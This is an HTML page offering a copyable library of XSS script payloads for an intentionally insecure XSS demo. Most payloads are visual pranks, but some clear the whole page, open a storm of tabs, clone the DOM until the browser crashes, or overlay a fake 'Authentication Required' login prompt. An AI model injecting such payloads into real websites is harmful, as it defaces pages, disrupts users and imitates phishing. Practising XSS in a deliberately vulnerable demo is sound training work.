<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Payload Library — AdmiraLahav</title>
  <link rel="stylesheet" href="style.css">

  <style>
    /* Extra styling specific to this page */

    .payload-list {
      background: rgba(255,255,255,0.03);
      padding: 20px;
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.05);
      backdrop-filter: blur(6px);
    }

    .payload-item {
      background: #0e141b;
      border-radius: 12px;
      margin-bottom: 20px;
      padding: 20px;
      border: 1px solid rgba(255,255,255,0.08);
    }

    .payload-item h3 {
      color: var(--accent);
      margin: 0 0 10px 0;
    }

    .payload-item .description {
      color: var(--text);
      opacity: 0.85;
      margin-bottom: 12px;
    }

    .payload-item pre {
      background: #000;
      padding: 12px;
      border-radius: 10px;
      border: 1px solid rgba(255,255,255,0.10);
      white-space: pre-wrap;
      color: #00aaff;
    }

    .copy-btn {
      margin-top: 10px;
      background: var(--accent);
      border: none;
      padding: 8px 14px;
      border-radius: 6px;
      color: #fff;
      cursor: pointer;
    }

    .copy-btn:hover {
      background: #0090e0;
    }

    .return-btn {
      margin-top: 25px;
      background: #ff4455;
      border: none;
      padding: 10px 20px;
      border-radius: 8px;
      color: #fff;
      cursor: pointer;
      font-size: 1rem;
    }

    .return-btn:hover {
      background: #dd2f3d;
    }
    /* Override main layout for this page */
.grid-container {
  display: flex !important;
  justify-content: center;
  padding: 20px;
}

/* Make the main panel narrower & centered */
.main-panel {
  width: 100%;
  max-width: 900px;
  margin: auto;
}

/* Make payload items expand properly */
.payload-list {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.payload-item {
  width: 96%;
}
  </style>
</head>

<body>

  <header>
    <h1>XSS Payload Library</h1>
    <p>Curated payloads for the intentionally insecure XSS demo.</p>
  </header>

  <div class="grid-container">
    <main class="main-panel">

      <section class="payload-list">

        <!-- PAYLOAD 1 -->
        <div class="payload-item">
          <h3>Matrix Blue Mode</h3>
          <p class="description">
            Turns the entire page into a blue cyber “matrix” theme with animated glow.
          </p>
          <pre>
&lt;script&gt;
document.body.style.background = "#090d12";
document.body.style.color = "#00aaff";
document.body.style.textShadow = "0 0 6px #0090e0";
document.body.innerHTML += "&lt;h1 style='text-align:center;color:#00aaff;'&gt;Matrix Blue Mode Activated&lt;/h1&gt;";
&lt;/script&gt;
          </pre>
          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>

        <!-- PAYLOAD 2 -->
        <div class="payload-item">
          <h3>Fake Login Popup</h3>
          <p class="description">
            Shows a full-screen blurred login prompt — perfect for UI-themed XSS pranks.
          </p>
          
          <pre>
&lt;script&gt;
document.body.innerHTML += \`
&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;
backdrop-filter:blur(6px);background:rgba(0,0,0,0.65);
display:flex;align-items:center;justify-content:center;
font-family:Poppins,sans-serif;color:#e0f0ff;"&gt;
  &lt;div style="background:#101820;padding:30px;border:2px solid #00aaff;
  border-radius:10px;width:320px;text-align:center;box-shadow:0 0 12px #00aaff;"&gt;
    &lt;h2 style="color:#00aaff;"&gt;Authentication Required&lt;/h2&gt;
    &lt;input placeholder="Username" style="width:90%;padding:10px;margin:10px 0;
    border:1px solid #00aaff;background:#0e141b;color:#e0f0ff;"&gt;
    &lt;input type="password" placeholder="Password" style="width:90%;padding:10px;margin:10px 0;
    border:1px solid #00aaff;background:#0e141b;color:#e0f0ff;"&gt;
    &lt;button style="background:#00aaff;border:none;color:white;padding:10px 22px;
    border-radius:6px;cursor:pointer;"&gt;Login&lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
\`;
&lt;/script&gt;
</pre>

          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>

        <!-- PAYLOAD 3 -->
        <div class="payload-item">
          <h3>System Breach Text Replacement</h3>
          <p class="description">
            Replaces every visible word on the page with “⚠ SYSTEM BREACHED ⚠”.
          </p>
          <pre>
&lt;script&gt;
document.querySelectorAll("*").forEach(el=>{
  if(el.childNodes.length===1 && el.childNodes[0].nodeType===3){
    el.style.color = "#fc0202";
    el.textContent = "⚠ SYSTEM BREACHED ⚠";
  }
});
&lt;/script&gt;
          </pre>
          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>

        <!-- PAYLOAD 4 -->
        <div class="payload-item">
          <h3>Infinite Rotation</h3>
          <p class="description">Spins the entire website forever.</p>
          <pre>
&lt;script&gt;
document.body.style.animation = "spin 6s linear infinite";
document.body.innerHTML += "&lt;style&gt;@keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }&lt;/style&gt;";
&lt;/script&gt;
          </pre>
          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>

        <!-- PAYLOAD 5 -->
        <div class="payload-item">
          <h3>Bouncing Buttons</h3>
          <p class="description">Spawns 100 bouncing UI buttons that jump away when hovered.</p>
          
          <pre>
&lt;script&gt;
for (let i = 0; i &lt; 100; i++) {
  const b = document.createElement("button");
  b.textContent = "Click";
  b.style.position = "fixed";
  b.style.left = Math.random() * 100 + "vw";
  b.style.top = Math.random() * 100 + "vh";
  b.style.transition = "0.2s";
  b.style.background = "#00aaff";
  b.style.color = "#fff";
  b.style.border = "none";
  b.style.padding = "8px 16px";
  b.style.borderRadius = "6px";
  b.style.cursor = "pointer";

  b.onmouseover = () =&gt; {
    b.style.left = Math.random() * 100 + "vw";
    b.style.top = Math.random() * 100 + "vh";
  };

  document.body.appendChild(b);
}
&lt;/script&gt;
</pre>

          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>

        <!-- PAYLOAD 6 -->
        <div class="payload-item">
          <h3>Screen Shake</h3>
          <p class="description">Makes the entire page vibrate like it's glitching out.</p>
          <pre>
&lt;script&gt;
setInterval(()=>{ 
  document.body.style.transform="translate("+(Math.random()*15-7)+"px,"+(Math.random()*15-7)+"px)";
},60);
&lt;/script&gt;
          </pre>
          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>

        <!-- PAYLOAD 7 -->
        <div class="payload-item">
          <h3>Neon Glow Mode</h3>
          <p class="description">Paints the whole page in neon blue with glowing text.</p>
          <pre>
&lt;script&gt;
document.body.style.background="#090d12";
document.querySelectorAll("*").forEach(el=>{
  el.style.color="#e0f0ff";
  el.style.textShadow="0 0 10px #00aaff";
});
&lt;/script&gt;
          </pre>
          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>
        <!-- PAYLOAD 8 -->
        <div class="payload-item">
          <h3>Full Website Takeover</h3>
          <p class="description">Deletes teh whole page and displays a skull emoji in a random position on teh screen.</p>
          
            <pre>
&lt;script&gt;
document.body.innerHTML = "";
setInterval(() =&gt; {
  const d = document.createElement("div");
  d.textContent = "💀";
  d.style.position = "fixed";
  d.style.left = Math.random() * 100 + "vw";
  d.style.top = Math.random() * 100 + "vh";
  d.style.fontSize = (Math.random() * 80 + 20) + "px";
  d.style.color = "#00aaff";
  document.body.appendChild(d);
}, 50);
&lt;/script&gt;
          </pre>
          <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
        </div>
        <!-- PAYLOAD 9 -->
<div class="payload-item">
  <h3>Screen Meltdown</h3>
  <p class="description">Applies an unstable blur and hue rotation effect, making the entire page look like it's melting and glitching.</p>
  
  <pre>
&lt;script&gt;
let melt = setInterval(() =&gt; {
  document.body.style.filter =
    "blur(" + (Math.random() * 5) + "px) hue-rotate(" + (Math.random() * 360) + "deg)";
}, 80);
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

        <!-- PAYLOAD 10 -->
<div class="payload-item">
  <h3>Page Implosion</h3>
  <p class="description">Every element shrinks and collapses into the center of the screen, creating a dramatic implosion effect.</p>

  <pre>
&lt;script&gt;
document.querySelectorAll("*").forEach(el =&gt; {
  el.style.transition = "1s";
  el.style.transform = "scale(0) translate(-50vw, -50vh)";
});
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

        <!-- PAYLOAD 11 -->
<div class="payload-item">
  <h3>Acid Trip Mode</h3>
  <p class="description">Turns the page into a rapidly shifting rainbow strobe show with changing background and text colors.</p>

  <pre>
&lt;script&gt;
setInterval(() =&gt; {
  document.body.style.background =
    "hsl(" + Math.random() * 360 + ",100%,50%)";
  document.body.style.color =
    "hsl(" + Math.random() * 360 + ",80%,70%)";
}, 120);
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

<!-- PAYLOAD 12 -->
<div class="payload-item">
  <h3>Popup Storm</h3>
  <p class="description">Rapidly opens 20 new browser tabs. Extremely chaotic.</p>

  <pre>
&lt;script&gt;
for (let i = 0; i &lt; 20; i++) {
  window.open("https://google.com?q=XSS" + i, "_blank");
}
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

<!-- PAYLOAD 13 -->
<div class="payload-item">
  <h3>DOM Tornado</h3>
  <p class="description">Makes every element on the page spin in circles while moving around, creating a violent tornado effect.</p>

  <pre>
&lt;script&gt;
document.querySelectorAll("*").forEach(el =&gt; {
  el.style.position = "relative";
  el.style.animation = "spinmove 1s infinite linear";
});
document.body.innerHTML += `
&lt;style&gt;
@keyframes spinmove {
  from { transform: rotate(0deg) translateX(0); }
  to   { transform: rotate(360deg) translateX(40px); }
}
&lt;/style&gt;`;
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

<!-- PAYLOAD 14 -->
<div class="payload-item">
  <h3>Infinite Element Cloner</h3>
  <p class="description">Continuously duplicates the entire page DOM every 400ms. Usually crashes the page.</p>

  <pre>
&lt;script&gt;
setInterval(() =&gt; {
  document.body.appendChild(
    document.body.cloneNode(true)
  );
}, 400);
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

<!-- PAYLOAD 15 -->
<div class="payload-item">
  <h3>Cursor Skull Trail</h3>
  <p class="description">Skull emojis follow the user's mouse movement, creating a trail that rapidly appears and disappears.</p>

  <pre>
&lt;script&gt;
document.onmousemove = e =&gt; {
  const s = document.createElement("div");
  s.textContent = "💀";
  s.style.position = "fixed";
  s.style.left = e.clientX + "px";
  s.style.top = e.clientY + "px";
  s.style.fontSize = "30px";
  s.style.pointerEvents = "none";
  document.body.appendChild(s);
  setTimeout(() =&gt; s.remove(), 400);
};
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

        <!-- PAYLOAD 15 -->
<div class="payload-item">
  <h3>Black Hole Collapse</h3>
  <p class="description">Shrinks the entire page over 5 seconds into a single invisible point.</p>

  <pre>
&lt;script&gt;
document.body.style.transition = "5s";
document.body.style.transformOrigin = "50% 50%";
document.body.style.transform = "scale(0)";
&lt;/script&gt;
  </pre>

  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
</div>

        <button class="return-btn" onclick="location.href='Main.html'">
          ← Return to XSS Demo
        </button>

      </section>

    </main>
  </div>

  <script>
    function copyPayload(e) {
      const pre = e.target.parentElement.querySelector("pre").innerText;
      navigator.clipboard.writeText(pre);
      e.target.innerText = "Copied!";
      setTimeout(() => e.target.innerText = "Copy", 1000);
    }
  </script>

</body>
</html>
